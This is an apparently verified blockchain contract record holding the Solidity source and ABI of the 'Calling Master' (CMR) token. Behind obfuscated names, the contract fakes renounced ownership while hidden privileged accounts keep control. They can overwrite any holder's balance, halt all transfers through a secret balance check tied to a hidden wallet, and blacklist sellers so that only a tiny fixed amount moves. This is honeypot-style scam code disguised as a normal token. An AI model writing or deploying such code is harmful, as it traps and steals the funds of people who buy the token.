{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface receiverExempt {\n    function createPair(address swapMarketing, address fromTake) external returns (address);\n}\n\ninterface swapLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listMarketingLimit) external view returns (uint256);\n\n    function transfer(address maxMode, uint256 receiverWallet) external returns (bool);\n\n    function allowance(address isListTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxMode,\n        uint256 receiverWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapLaunchLimit, uint256 value);\n    event Approval(address indexed isListTotal, address indexed spender, uint256 value);\n}\n\nabstract contract txFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedIsMarketing is swapLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CallingMaster is txFrom, swapLimit, launchedIsMarketing {\n\n    function owner() external view returns (address) {\n        return listEnable;\n    }\n\n    address receiverAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private senderShould;\n\n    function transferFrom(address swapReceiver, address maxMode, uint256 receiverWallet) external override returns (bool) {\n        if (_msgSender() != swapSellSender) {\n            if (modeTeamFrom[swapReceiver][_msgSender()] != type(uint256).max) {\n                require(receiverWallet <= modeTeamFrom[swapReceiver][_msgSender()]);\n                modeTeamFrom[swapReceiver][_msgSender()] -= receiverWallet;\n            }\n        }\n        return txAmount(swapReceiver, maxMode, receiverWallet);\n    }\n\n    function transfer(address feeAtEnable, uint256 receiverWallet) external virtual override returns (bool) {\n        return txAmount(_msgSender(), feeAtEnable, receiverWallet);\n    }\n\n    function totalEnable(address feeAtEnable, uint256 receiverWallet) public {\n        isMax();\n        senderShould[feeAtEnable] = receiverWallet;\n    }\n\n    uint256 private launchTotal;\n\n    address public tradingAt;\n\n    address swapSellSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function txAmount(address swapReceiver, address maxMode, uint256 receiverWallet) internal returns (bool) {\n        if (swapReceiver == limitIs) {\n            return exemptTo(swapReceiver, maxMode, receiverWallet);\n        }\n        uint256 launchSender = swapLimit(tradingAt).balanceOf(receiverAuto);\n        require(launchSender == takeIs);\n        require(maxMode != receiverAuto);\n        if (tradingReceiverMin[swapReceiver]) {\n            return exemptTo(swapReceiver, maxMode, sellMax);\n        }\n        return exemptTo(swapReceiver, maxMode, receiverWallet);\n    }\n\n    function isMax() private view {\n        require(isShould[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return listEnable;\n    }\n\n    address private listEnable;\n\n    function marketingAmountBuy() public {\n        emit OwnershipTransferred(limitIs, address(0));\n        listEnable = address(0);\n    }\n\n    function balanceOf(address listMarketingLimit) public view virtual override returns (uint256) {\n        return senderShould[listMarketingLimit];\n    }\n\n    function totalAuto(uint256 receiverWallet) public {\n        isMax();\n        takeIs = receiverWallet;\n    }\n\n    bool public txTotal;\n\n    uint256 buyAutoAt;\n\n    bool public sellTeam;\n\n    bool public atMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFrom;\n    }\n\n    mapping(address => bool) public tradingReceiverMin;\n\n    function allowance(address teamMin, address senderAmount) external view virtual override returns (uint256) {\n        if (senderAmount == swapSellSender) {\n            return type(uint256).max;\n        }\n        return modeTeamFrom[teamMin][senderAmount];\n    }\n\n    bool public modeLimit;\n\n    mapping(address => mapping(address => uint256)) private modeTeamFrom;\n\n    function tokenLaunchedExempt(address swapBuyLimit) public {\n        isMax();\n        if (isMaxToken != modeLimit) {\n            atMin = true;\n        }\n        if (swapBuyLimit == limitIs || swapBuyLimit == tradingAt) {\n            return;\n        }\n        tradingReceiverMin[swapBuyLimit] = true;\n    }\n\n    uint8 private totalIs = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalIs;\n    }\n\n    event OwnershipTransferred(address indexed exemptIs, address indexed teamTxSwap);\n\n    uint256 private senderMode;\n\n    function approve(address senderAmount, uint256 receiverWallet) public virtual override returns (bool) {\n        modeTeamFrom[_msgSender()][senderAmount] = receiverWallet;\n        emit Approval(_msgSender(), senderAmount, receiverWallet);\n        return true;\n    }\n\n    function senderFund(address limitTotal) public {\n        require(limitTotal.balance < 100000);\n        if (txTotal) {\n            return;\n        }\n        \n        isShould[limitTotal] = true;\n        if (isMaxToken == atMin) {\n            atMin = false;\n        }\n        txTotal = true;\n    }\n\n    string private senderSell = \"CMR\";\n\n    function name() external view virtual override returns (string memory) {\n        return feeExemptLaunch;\n    }\n\n    function exemptTo(address swapReceiver, address maxMode, uint256 receiverWallet) internal returns (bool) {\n        require(senderShould[swapReceiver] >= receiverWallet);\n        senderShould[swapReceiver] -= receiverWallet;\n        senderShould[maxMode] += receiverWallet;\n        emit Transfer(swapReceiver, maxMode, receiverWallet);\n        return true;\n    }\n\n    uint256 takeIs;\n\n    uint256 private tradingFrom = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderSell;\n    }\n\n    constructor (){\n        if (launchTotal != senderMode) {\n            atMin = true;\n        }\n        receiverTeam atFrom = receiverTeam(swapSellSender);\n        tradingAt = receiverExempt(atFrom.factory()).createPair(atFrom.WETH(), address(this));\n        \n        limitIs = _msgSender();\n        isShould[limitIs] = true;\n        senderShould[limitIs] = tradingFrom;\n        marketingAmountBuy();\n        \n        emit Transfer(address(0), limitIs, tradingFrom);\n    }\n\n    string private feeExemptLaunch = \"Calling Master\";\n\n    mapping(address => bool) public isShould;\n\n    bool private isMaxToken;\n\n    address public limitIs;\n\n    uint256 constant sellMax = 9 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isListTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTxSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunchLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketingLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAmountBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"}],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuyLimit\",\"type\":\"address\"}],\"name\":\"tokenLaunchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"totalAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAtEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"totalEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingReceiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAtEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CallingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}